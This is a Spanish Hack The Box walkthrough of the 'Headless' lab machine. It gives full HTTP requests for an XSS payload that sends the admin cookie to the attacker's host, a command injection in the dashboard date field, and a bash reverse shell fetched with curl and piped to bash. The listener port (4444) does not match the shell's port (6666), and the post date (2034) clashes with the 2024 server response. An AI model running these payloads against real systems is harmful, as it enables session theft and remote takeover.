---
title: "Headless - HTB"
description: "Máquina HTB que usa XSS basado en DOM."
date: 30-03-2034
tags: ["XSS", "Reverse Shell"]
---

# Headless

```c
TARGET=10.10.11.8
```

```c
nmap -A -T4 -v $TARGET -oN nmap.out
```

[http://10.10.11.8:5000/](http://10.10.11.8:5000/)

![Untitled](/seguridad/headless/Untitled.png)

[http://10.10.11.8:5000/support](http://10.10.11.8:5000/support)

![Untitled](/seguridad/headless/Untitled%201.png)

[http://10.10.11.8:5000/dashboard](http://10.10.11.8:5000/dashboard)

![Untitled](/seguridad/headless/Untitled%202.png)

# Burp Suite

- Capturamos en la ruta [http://10.10.11.8:5000/support](http://10.10.11.8:5000/support) la petición HTTP/POST, enviamos al repetidor para realizar pruebas.

```cpp
POST /support HTTP/1.1
Host: 10.10.11.8:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 88
Origin: http://10.10.11.8:5000
Connection: close
Referer: http://10.10.11.8:5000/support
Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
Upgrade-Insecure-Requests: 1

fname=First&lname=Last&email=mail%40asd.com&phone=3454354&message=hola+este+s+el+mensaje
```

# XSS basado en DOM

Probaremos inyectando código en el atributo `message` del `body`. 

- Petición HTTP

```cpp
POST /support HTTP/1.1
Host: 10.10.11.8:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 158
Origin: http://10.10.11.8:5000
Connection: close
Referer: http://10.10.11.8:5000/support
Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
Upgrade-Insecure-Requests: 1

fname=sdasda&lname=asdasd&email=asdas%40asdasd.asd&phone=asdasd&message=<script>document.location="http://10.10.14.144/ovidioxd.js?c="+document.cookie;</script>
```

- Respuesta HTTP

```cpp
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.11.2
Date: Sat, 30 Mar 2024 20:34:06 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2294
Connection: close

<!DOCTYPE html>
<html lang="en">
<head>...
</head>
<body>
    <div class="container">
        <h1>Hacking Attempt Detected</h1>
        <p>Your IP address has been flagged, a report with your browser information has been sent to the administrators for investigation.</p>
        <p><strong>Client Request Information:</strong></p>
        <pre><strong>Method:</strong> POST<br><strong>URL:</strong> http://10.10.11.8:5000/support<br><strong>Headers:</strong> <strong>Host:</strong> 10.10.11.8:5000<br><strong>User-Agent:</strong> Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0<br><strong>Accept:</strong> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><strong>Accept-Language:</strong> en-US,en;q=0.5<br><strong>Accept-Encoding:</strong> gzip, deflate<br><strong>Content-Type:</strong> application/x-www-form-urlencoded<br><strong>Content-Length:</strong> 160<br><strong>Origin:</strong> http://10.10.11.8:5000<br><strong>Connection:</strong> close<br><strong>Referer:</strong> http://10.10.11.8:5000/support<br><strong>Cookie:</strong> is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs<br><strong>Upgrade-Insecure-Requests:</strong> 1<br><br></pre>
    </div>
</body>
</html>
```

- La respuesta se vería algo como esto

![Untitled](/seguridad/headless/Untitled%203.png)

Esto nos indica que está enviado información al administrador, quizás pueda tener una cookie interesante.

Para ejecutar código desde el servidor web, levantamos un servicio web local para escuchar la respuesta del servidor web e insertamos el vector de ataque en alguna cabecera de la petición HTTP.

- Levantamos un servidor para recibir la variable `document.cookie` del servidor.
    
    ```cpp
    sudo python -m http.server 80
    ```
    

- Vector de ataque.
    
    ```cpp
    <script>document.location="http://10.10.14.144/ovidioxd.js?c="+document.cookie;</script>```
    ```
    

- Petición HTTP/POST con inyección en  `User-Agent` .
    
    ```c
    POST /support HTTP/1.1
    Host: 10.10.11.8:5000
    User-Agent: <script>document.location="http://10.10.14.144/ovidio?xd="+document.cookie;</script>
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 158
    Origin: http://10.10.11.8:5000
    Connection: close
    Referer: http://10.10.11.8:5000/support
    Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
    Upgrade-Insecure-Requests: 1
    
    fname=sdasda&lname=asdasd&email=asdas%40asdasd.asd&phone=asdasd&message=<script>document.location="http://10.10.14.144/ovidio?xd="+document.cookie;</script>
    ```
    

En el servidor local debería recibir la cookie, de esta manera.

![Untitled](/seguridad/headless/Untitled%204.png)

Con la nueva cookie intentamos acceder al sitio que estaba bloqueado.

[https://10.10.11.8:5000/dashboard](http://10.10.11.8:5000/dashboard)

![Untitled](/seguridad/headless/Untitled%202.png)

Insertamos las cookies y ya tenemos acceso.

![Untitled](/seguridad/headless/Untitled%205.png)

Al generar el reporte, se realiza una petición con la fecha al servidor.

```cpp
POST /dashboard HTTP/1.1
Host: 10.10.11.8:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 60
Origin: http://10.10.11.8:5000
Connection: close
Referer: http://10.10.11.8:5000/dashboard
Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
Upgrade-Insecure-Requests: 1

date=2023-09-1
```

Probamos si podemos ejecutar remotamente desde esta petición.

```cpp
POST /dashboard HTTP/1.1
Host: 10.10.11.8:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 60
Origin: http://10.10.11.8:5000
Connection: close
Referer: http://10.10.11.8:5000/dashboard
Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
Upgrade-Insecure-Requests: 1

date=2023-09-15; curl http://10.10.14.144/echo
```

![Untitled](/seguridad/headless/Untitled%206.png)

Preparamos entonces una reverse shell.

# Reverse Shell (RS)

- Reverse Shell en bash.

```bash
#!/bin/bash
# rce-ovidio.sh
bash -c 'bash -i &>/dev/tcp/10.10.14.144/6666 <&1'
```

- Ejecutamos los servicios necesarios.

```c
python -m http.server 80 // servir la RS en la red.
nc -nlvp 4444 // abrir puerto 4444 para escucha de la RS .
```

- Inyectamos la RS en el servidor y

```c
POST /dashboard HTTP/1.1
Host: 10.10.11.8:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 60
Origin: http://10.10.11.8:5000
Connection: close
Referer: http://10.10.11.8:5000/dashboard
Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
Upgrade-Insecure-Requests: 1

date=2023-09-15; curl http://10.10.14.144/rce-ovidio.sh|bash
```